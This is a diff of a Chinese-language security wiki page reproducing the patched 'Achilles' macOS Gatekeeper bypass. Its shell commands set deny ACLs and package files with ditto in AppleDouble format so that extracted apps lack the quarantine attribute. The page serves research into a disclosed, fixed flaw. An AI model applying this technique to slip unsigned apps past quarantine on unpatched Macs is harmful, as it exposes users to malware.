@@ -1,12 +1,71 @@
-# macOS xattr-acls 其他内容
+# AppleDouble ACL Quarantine Bypass 复现
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-这个历史概念验证复现了 Achilles Gatekeeper bypass 研究中使用的 AppleDouble/ACL 技术。它将 ACL 序列化，存储在 AppleDouble sidecar 文件中，将属性重命名为 `com.apple.acl.text`，然后重新打包 ZIP。<sup>[[1]](#references)[[2]](#references)</sup>
+这个历史概念验证复现了 Achilles Gatekeeper bypass 研究中使用的 AppleDouble/ACL 技术。它会序列化 ACL，将其存储在 AppleDouble sidecar 文件中，将属性重命名为 `com.apple.acl.text`，然后重新打包 ZIP。<sup>[[1]](#references)[[2]](#references)</sup>
 
-Apple 已在 macOS Ventura 13、Monterey 12.6.2 和 Big Sur 11.7.2 中修复了 Gatekeeper bypass；在当前的 Mac 上恢复 ACL 并不能证明 Gatekeeper bypass 仍然有效。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Apple 已在 macOS Ventura 13、Monterey 12.6.2 和 Big Sur 11.7.2 中修复了 Gatekeeper bypass；在当前 Mac 上恢复 ACL 并不能证明 Gatekeeper bypass 仍然有效。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 有关 quarantine 和首次启动检查，请参阅 [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses)。
+
+## ACL 和 AppleDouble 文件系统行为
+
+### writeextattr ACL
+
+此 ACL 会阻止向文件添加 `xattrs`】【。
+
+```bash
+rm -rf /tmp/test*
+echo test >/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+```
+
+### **com.apple.acl.text xattr + AppleDouble**
+
+**AppleDouble** 文件格式会复制文件及其 ACE。
+
+在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中可以看到，存储在名为 **`com.apple.acl.text`** 的 xattr 中的 ACL 文本表示形式，会被设置为解压后文件的 ACL。因此，如果你将应用程序压缩为采用 **AppleDouble** 文件格式的 zip 文件，并设置一个阻止其他 xattr 写入的 ACL……那么 quarantine xattr 就不会被设置到应用程序上：
+
+更多信息请查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)。<sup>[[1]](#references)</sup>
+
+要复现这一点，我们首先需要获取正确的 ACL 字符串：
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+（请注意，即使此方法有效，沙箱也会先写入 quarantine xattr）
+
+## AppleDouble 旁文件的构造与验证
 
 ```bash
 rm -rf /tmp/test*
@@ -191,9 +250,9 @@ xattr -p com.apple.quarantine protected
 
 ## References
 
-- [1] [Microsoft Security Blog — Gatekeeper 的致命弱点：揭露 macOS 漏洞](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [1] [Microsoft Security Blog — Gatekeeper 的阿喀琉斯之踵：揭示 macOS 漏洞](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
 - [2] [Apple Developer — 使用 `ditto` 打包 Mac 软件以供分发](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
-- [3] [Apple Support — 关于 macOS Ventura 13 的安全性内容](https://support.apple.com/en-ae/102853)
-- [4] [Apple Support — 关于 macOS Monterey 12.6.2 的安全性内容](https://support.apple.com/en-ae/102806)
-- [5] [Apple Support — 关于 macOS Big Sur 11.7.2 的安全性内容](https://support.apple.com/en-us/102785)
+- [3] [Apple Support — 关于 macOS Ventura 13 的安全内容](https://support.apple.com/en-ae/102853)
+- [4] [Apple Support — 关于 macOS Monterey 12.6.2 的安全内容](https://support.apple.com/en-ae/102806)
+- [5] [Apple Support — 关于 macOS Big Sur 11.7.2 的安全内容](https://support.apple.com/en-us/102785)
 {{#include ../../../../banners/hacktricks-training.md}}
